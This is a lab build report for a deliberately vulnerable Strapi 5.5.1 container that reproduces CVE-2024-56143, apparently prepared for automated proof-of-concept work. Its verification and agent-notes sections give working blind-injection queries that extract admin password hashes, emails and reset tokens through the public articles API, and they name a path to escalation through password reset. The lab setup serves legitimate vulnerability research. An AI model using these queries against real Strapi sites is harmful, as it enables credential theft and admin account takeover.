# Lab Build Report: CVE-2024-56143

## Lab Architecture

**Single-container lab** running Strapi 5.5.1 (vulnerable) with SQLite database. No external services required — Strapi with SQLite is fully self-contained.

```
┌──────────────────────────────────────────┐
│  cve-2024-56143-vulnerable               │
│  ┌────────────────────────────────────┐  │
│  │  Strapi 5.5.1 (Node.js 20)        │  │
│  │  Port: 1337                        │  │
│  │  Database: SQLite (.tmp/data.db)   │  │
│  │  Content Type: Article (public)    │  │
│  │  Admin: admin@lab.local             │  │
│  └────────────────────────────────────┘  │
└──────────────────────────────────────────┘
```

---

## Container Details

### Vulnerable Container

| Field | Value |
|-------|-------|
| **Container Name** | `cve-2024-56143-vulnerable` |
| **Image** | `cve-2024-56143-vulnerable:latest` |
| **Base Image** | `node:20-slim` (Debian Bookworm) |
| **Strapi Version** | 5.5.1 |
| **Node.js Version** | 20.20.0 |
| **Database** | SQLite via `better-sqlite3@11.3.0` |
| **Port** | 1337 (HTTP) |
| **Networks** | `lab-net` |
| **Healthcheck** | `curl -sf http://localhost:1337/_health` |

### Pre-configured Content

| Item | Details |
|------|---------|
| **Admin User** | `admin@lab.local` / `Admin12345!` |
| **Content Type** | `Article` (collection type with `title` and `body` fields) |
| **Public Permissions** | `find` and `findOne` enabled for Article |
| **Test Article** | "Test Article for CVE-2024-56143" (published) |
| **Content API** | `GET /api/articles` (public, no auth required) |

---

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| **Docker Image Build** | ✅ SUCCESS | Builds cleanly from `node:20-slim` |
| **npm install** | ✅ SUCCESS | All dependencies installed with `--legacy-peer-deps` |
| **Strapi Startup** | ✅ SUCCESS | Starts in ~3s, healthy within 4s |
| **Admin Registration** | ✅ SUCCESS | Automated via setup script |
| **Permissions Config** | ✅ SUCCESS | Public role configured for Article find/findOne |
| **Article Creation** | ✅ SUCCESS | Created and published via content-manager API |
| **Public API Access** | ✅ SUCCESS | `GET /api/articles` returns 1 article |
| **Vulnerability Confirmed** | ✅ EXPLOITABLE | Blind password hash extraction verified |

---

## Start/Stop Commands

### Start Lab
```bash
docker compose up -d
```

### Stop Lab
```bash
docker compose down
```

### Stop Lab and Reset Data
```bash
docker compose down -v
```

### Rebuild
```bash
docker compose build --no-cache
```

### View Logs
```bash
docker compose logs -f
```

---

## Verification Evidence

### Health Check
```
curl -sf http://<CONTAINER_IP>:1337/_health → 204 No Content ✓
```

### Strapi Version
```
$ docker exec cve-2024-56143-vulnerable node -e "console.log(require('@strapi/strapi/package.json').version)"
5.5.1
```

### Public API Access
```json
GET /api/articles → 200 OK
{
  "data": [
    {
      "id": 2,
      "documentId": "r0izqxyu2evpi7poe71n6y1c",
      "title": "Test Article for CVE-2024-56143",
      "body": "This is a test article...",
      "publishedAt": "2026-02-28T18:09:03.553Z"
    }
  ],
  "meta": { "pagination": { "total": 1 } }
}
```

### Vulnerability Confirmation

**Test: Lookup parameter injection to access admin password hash**
```
GET /api/articles?lookup[createdBy][password][$startsWith]=$2 → 1 article (MATCH)
GET /api/articles?lookup[createdBy][password][$startsWith]=WRONG → 0 articles (NO MATCH)
```

**Test: Blind extraction of bcrypt hash prefix**
```
Position 1: '$' → $
Position 2: '2' → $2
Position 3: 'a' → $2a
Position 4: '$' → $2a$
Position 5: '1' → $2a$1
Position 6: '0' → $2a$10
Position 7: '$' → $2a$10$
Position 8: 'r' → $2a$10$r
Position 9: 'z' → $2a$10$rz
Position 10: 'u' → $2a$10$rzu
```

**Test: Admin email extraction**
```
GET /api/articles?lookup[createdBy][email][$startsWith]=admin@ → 1 article (MATCH)
GET /api/articles?lookup[createdBy][email][$startsWith]=wrong@ → 0 articles (NO MATCH)
```

---

## Network Access

The container exposes port 1337 on the Docker host:

```bash
curl -sf "http://localhost:1337/api/articles"
```

---

## Lab Files

| File | Purpose |
|------|---------|
| `docker-compose.yml` | Container orchestration |
| `Dockerfile.vulnerable` | Vulnerable Strapi 5.5.1 image |
| `package.json` | Node.js project dependencies |
| `config/database.js` | SQLite database config |
| `config/server.js` | Server config (host, port, keys) |
| `config/admin.js` | Admin panel config (JWT secret) |
| `config/api.js` | REST API config |
| `config/middlewares.js` | Middleware stack |
| `config/plugins.js` | Plugin config |
| `article-schema.json` | Article content type schema |
| `setup-strapi.sh` | Entrypoint: starts Strapi + auto-configures |

---

## PoC Agent Notes

### Connecting to the Lab
```bash
STRAPI_URL="http://localhost:1337"
```

### Key Endpoints

| Endpoint | Auth | Purpose |
|----------|------|---------|
| `GET /api/articles` | None | Public content API (attack surface) |
| `GET /api/articles?lookup[createdBy][password][$startsWith]=X` | None | Vulnerability trigger |
| `POST /admin/register-admin` | None | Register admin (first run only) |
| `POST /admin/login` | None | Admin login → JWT token |
| `POST /admin/forgot-password` | None | Trigger password reset (for escalation) |

### Credentials
- **Admin Email**: `admin@lab.local`
- **Admin Password**: `Admin12345!`

### Exploitation Parameters
- **Vulnerable endpoint**: `GET /api/articles`
- **Injection parameter**: `lookup[<relation>][<private_field>][<operator>]=<value>`
- **Useful relations**: `createdBy`, `updatedBy`
- **Targetable fields**: `password`, `email`, `resetPasswordToken`, `registrationToken`
- **Useful operators**: `$startsWith`, `$contains`, `$eq`, `$ne`, `$endsWith`
- **Success indicator**: Response `data` array length > 0
- **Failure indicator**: Response `data` array length = 0

### Bcrypt Hash Properties
- Format: `$2a$10$<22-char-salt><31-char-hash>` (60 chars total)
- Charset: `a-z A-Z 0-9 . / $`
- ~1920 requests needed for full extraction (60 chars × ~32 avg attempts)

---

## Known Issues

None. The lab environment is fully functional and the vulnerability is confirmed exploitable.
